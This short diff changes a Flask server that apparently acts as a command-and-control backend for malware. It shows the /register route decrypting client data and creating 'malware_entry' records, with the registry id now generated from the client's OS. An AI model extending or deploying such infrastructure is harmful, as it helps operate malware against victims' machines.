@@ -4,8 +4,6 @@ import fileOps
 import encode
 import json
 
-
-
 app = Flask(__name__)
 
 @app.route("/clients")
@@ -34,13 +32,15 @@ def connect():
 @app.route("/register", methods=['POST'])
 def registry():
 
-    malwareRegistry = str(uuid.uuid1().int)
-
     json_payload = request.get_json()
 
     dec = encode.decrypt_message_priv(json_payload['data'])
     
     data_json = json.loads(dec)
+
+    malwareRegistry = str(encode.generate_id(data_json['OS']))
+
+    print(malwareRegistry)
 
     malware_entry = {
         "id": malwareRegistry,
